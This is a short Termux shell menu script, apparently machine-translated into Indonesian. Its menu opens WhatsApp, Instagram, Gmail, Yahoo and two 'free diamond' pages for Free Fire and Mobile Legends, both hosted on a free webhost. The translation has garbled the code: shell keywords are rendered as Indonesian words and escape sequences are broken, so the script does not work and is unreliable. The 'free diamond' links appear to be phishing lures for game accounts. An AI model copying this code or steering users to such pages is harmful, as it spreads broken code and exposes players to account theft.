bersih
# bagian warna
merah = " \ 033 [31; 1m "
putih = " \ 033 [39; 1m "
# tampilan bagian
toilet -f miring --gay "       MENU "
printf  " ████████████████████████████████████████████████ ██████
          01. Diamond Freefire = 404 04. Instagram
      02. WhatsApp 00. Keluar 05. Gmail
          03. Diamond ML = 209 06. Ya
██████████████████████████████████████████████████ ████ \ n "
# bagian perintah
printf  " \ n $ {putih} [ $ {merah} + $ {putih} ] pilihan = " gameo
baca gameo
jika [ $ gameo  = 1] || [ $ gameo  = 01] ; kemudian
termux-buka https://bulan-bintang123.000webhostapp.com/dataff.php
tidur 1
sh menu.sh
elif [ $ gameo  = 2] || [ $ gameo  = 02] ; kemudian
echo  " Masukan Nomer WhatsApp contoh 81299140 ×% "
printf  "  $ {putih} [ $ {merah} + $ {putih} ] input = " r
baca r ;
termux-buka https://wa.me/62 $ r
tidur 1
sh menu.sh
elif [ $ gameo  = 3] || [ $ gameo  = 03] ; kemudian
termux-open https://bulan-bintang123.000webhostapp.com/dataml.php
tidur 1
sh menu.sh
elif [ $ gameo  = 4] || [ $ gameo  = 04] ; kemudian
termux-buka https://www.instagram.com
tidur 1
sh menu.sh
elif [ $ gameo  = 5] || [ $ gameo  = 05] ; kemudian
termux-open https://www.gmail.com
tidur 1
sh menu.sh
elif [ $ gameo  = 6] || [ $ gameo  = 06] ; kemudian
termux-buka https://www.yahoo.com
tidur 1
sh menu.sh
elif [ $ gameo  = 0] || [ $ gameo  = 00] ; kemudian
bersih
keluar
lain
printf  " $ {merah} !!!! masukan salah atau tidak boleh kosong !!!! "
tidur 1
sh menu.sh
fi
